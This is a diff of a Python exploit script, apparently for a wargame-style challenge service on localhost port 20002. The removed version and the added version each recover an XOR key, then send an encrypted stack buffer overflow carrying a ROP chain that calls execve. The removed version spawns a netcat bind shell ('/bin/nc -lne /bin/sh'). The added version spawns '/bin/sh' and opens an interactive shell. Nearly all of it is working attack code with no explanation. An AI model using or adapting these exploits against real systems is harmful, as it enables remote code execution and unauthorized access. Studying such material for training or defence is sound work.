@@ -1,70 +1,54 @@
-# -*- coding: utf-8 -*-
-import socket, time
-from struct import pack, unpack
 
-JUNK=0xdeadbabe
-OVERFLOW=0x10
-overflowedSize=0x20000+OVERFLOW
-blocksize=128
-links=[
-0x804952d, # &nread
-0x8048815, # add esp, 8; pop ebx; ret
-1,         # nread(1,
-0x804b464, #       &buffer,
-20,        #       size)
-0x804952d, # &nread
-0x8048815, # add esp, 8; pop ebx; ret
-1,         # nread(1,
-0x804b42c, #       &buffer,
-13,        #       size)
-0x80489b0, # &(execve@plt)
-JUNK,
-0x804b471, # &"/bin/nc"
-0x804b42d, # &argv
-0          # no envp
-]
-chain=''.join(pack('I', link) for link in links)
-PAYLOAD='E'+pack('I', blocksize)+"\x00"*blocksize
-KEYBUF=[]
+#!/usr/bin/python
+import com
+import struct
 
-def cipher(message, length):
-global KEYBUF
-cipherd = []
-for i in xrange(0, length, 4):
-cipherd.append(unpack('I', message[i:i+4])[0]^KEYBUF[(i/4)%32])
-return cipherd
+def enc(s, keybuf):
+        pt=""
+        for i in range(0,len(s)/4):
+                o = struct.unpack("I",s[i*4:i*4+4])[0]
+                o = o^keybuf[i%32]
+                pt+=struct.pack("I",o)
+        return pt
 
-def main():
-global overflowedSize, blocksize, PAYLOAD, KEYBUF, chain
+so = com.connect(20002,1)
+print com.recvTime(so)
 
-# Create connection & Send initial payload 
-s = socket.create_connection(("127.0.0.1", 20002))
-s.sendall(PAYLOAD)
+s = "E"+struct.pack("I",0x80)+"A"*128
+so.send(s)
 
-# Flush some garbage down the toilet (177 ascii + 4 size)
-s.recv(181, socket.MSG_WAITALL)
+s = com.recvTime(so,128+124)[124:]
+print len(s)
 
-# retrieve the key, hashtag 1337cr4ck3r
-key=s.recv(128, socket.MSG_WAITALL)
-KEYBUF=[unpack('I',key[i:i+4])[0] for i in xrange(0, 128, 4)]
+keybuf=[]
+#XOR the output to cancel the original XOR
+for i in range(0,32):
+        o=struct.unpack("I",s[i*4:i*4+4])[0]
+        o=o^struct.unpack("I","AAAA")[0]
+        keybuf.append(o)
 
-# Create a ciphered block of payload
-payload='A'*(overflowedSize)+chain
-ENCRYPTED_PAYLOAD='E'+pack('I', overflowedSize+len(chain))
-ENCRYPTED_PAYLOAD+=''.join(pack('I', x) for x in cipher(payload, len(payload))) # <- EZ
 
-# Vamos ala explotar!
-s.sendall(ENCRYPTED_PAYLOAD+"Q")
-# Wait for our payload to process
-time.sleep(0.5)
-# send some strings with relevant binaries and arguments
-s.sendall('/bin/sh\x00-lne\x00/bin/nc\x00')
-# Cool people are late to the party
-time.sleep(0.5)
-# send argv pointers
-s.sendall(pack('I', 0x804b471)+pack('I', 0x804b46c)+pack('I',0x804b464))
-# All is well, Sayonara.
-s.close()
-return 0
+evp=0x804b3d8 #GOT of execve
+sh=0xb77ee8da #"/bin/sh"
+pebx=0x08048818 #pop %ebx | ret
+cebx=0x08049fe3 #call *(%ebx)
 
-exit(main())
+pl = "A"*0x20010
+pl+=struct.pack("I",pebx)
+pl+=struct.pack("I",evp)
+pl+=struct.pack("I",cebx)
+pl+=struct.pack("I",sh)
+pl+=struct.pack("I",0)*2
+
+s ="E"+struct.pack("I",len(pl))
+s+=enc(pl,keybuf)
+s+="Q"
+
+so.send(s)
+
+#eat up all the output
+for i in range(0,0x20014/4096+1):
+        com.recvTime(so)
+print com.recvTime(so)
+
+com.useShell(so)
